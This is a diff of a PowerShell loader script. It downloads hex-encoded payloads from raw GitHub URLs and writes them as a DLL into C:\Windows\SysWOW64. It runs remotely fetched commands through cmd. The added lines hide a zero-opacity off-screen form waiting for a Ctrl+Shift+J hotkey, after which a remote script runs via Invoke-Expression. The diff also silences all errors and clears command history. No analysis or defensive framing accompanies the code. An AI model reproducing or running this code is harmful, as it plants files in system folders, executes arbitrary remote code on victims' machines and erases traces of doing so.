@@ -1,3 +1,4 @@
+Add-Type -AssemblyName System.Windows.Forms
 $urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
 $urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
 $urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
@@ -6,10 +7,8 @@ $filePath = "C:\Windows\SysWOW64\ntdllp.dll"
 $clipText = "SteF6b2WrAgu"
 function HexToBytes {
     param([string]$hexStr)
-    # Remove any non-hex characters (anything not 0-9, A-F, a-f)
     $cleanHex = [regex]::Replace($hexStr, '[^0-9A-Fa-f]', '')
     if ($cleanHex.Length % 2 -ne 0) {
-        Write-Error "Cleaned hex string has an odd length: $($cleanHex.Length)"
         return $null
     }
     $byteArr = [byte[]]::new($cleanHex.Length / 2)
@@ -24,14 +23,8 @@ try {
     $bytes = HexToBytes $hexContent
     if ($bytes -ne $null) {
         [IO.File]::WriteAllBytes($filePath, $bytes)
-    } else {
-        Write-Error "Failed to convert hex content from $urlA to bytes."
-        exit 1
     }
-} catch {
-    Write-Error "Failed to download or process file from $urlA`: $_"
-    exit 1
-}
+} catch {}
 Set-Clipboard $clipText
 try {
     $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing -TimeoutSec 30
@@ -39,32 +32,41 @@ try {
     if ($cmdToRun) {
         Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
     }
-} catch {
-    Write-Error "Failed to download or execute command from $urlB`: $_"
-    exit 1
-}
-do {
-    Start-Sleep -Seconds 2
-} while (Get-Process -Name "Installer.exe" -ErrorAction SilentlyContinue)
+} catch {}
 try {
     $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing -TimeoutSec 30
     $newHexContent = $responseC.Content
     $newBytes = HexToBytes $newHexContent
     if ($newBytes -ne $null) {
         [IO.File]::WriteAllBytes($filePath, $newBytes)
-    } else {
-        Write-Error "Failed to convert hex content from $urlC to bytes."
     }
-} catch {
-    Write-Error "Failed to download or process file from $urlC`: $_"
+} catch {}
+$script:continueExecution = $false
+$global:HotkeyHandler = {
+    if ($_.KeyCode -eq [System.Windows.Forms.Keys]::J -and 
+        [System.Windows.Forms.Control]::ModifierKeys -eq ([System.Windows.Forms.Keys]::Control -bor [System.Windows.Forms.Keys]::Shift)) {
+        $script:continueExecution = $true
+    }
 }
+$form = New-Object System.Windows.Forms.Form
+$form.Size = New-Object System.Drawing.Size(100, 100)
+$form.Opacity = 0
+$form.ShowInTaskbar = $false
+$form.StartPosition = "Manual"
+$form.Location = New-Object System.Drawing.Point(-2000, -2000)
+$form.add_KeyDown($global:HotkeyHandler)
+$form.Show()
+$form.Activate()
+do {
+    Start-Sleep -Milliseconds 100
+} while (-not $script:continueExecution)
+$form.Close()
 try {
     $responseD = Invoke-WebRequest -Uri $urlD -UseBasicParsing -TimeoutSec 30
-    $finalCmdContent = $responseD.Content.Trim()
-    if ($finalCmdContent) {
-        Start-Process cmd -ArgumentList "/c $finalCmdContent" -NoNewWindow
+    $finalScriptContent = $responseD.Content.Trim()
+    if ($finalScriptContent) {
+        Invoke-Expression $finalScriptContent
     }
-} catch {
-    Write-Error "Failed to download or execute command from $urlD`: $_"
-}
-Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine*.txt" -Force -ErrorAction SilentlyContinue
+} catch {}
+Clear-History -ErrorAction SilentlyContinue
+exit
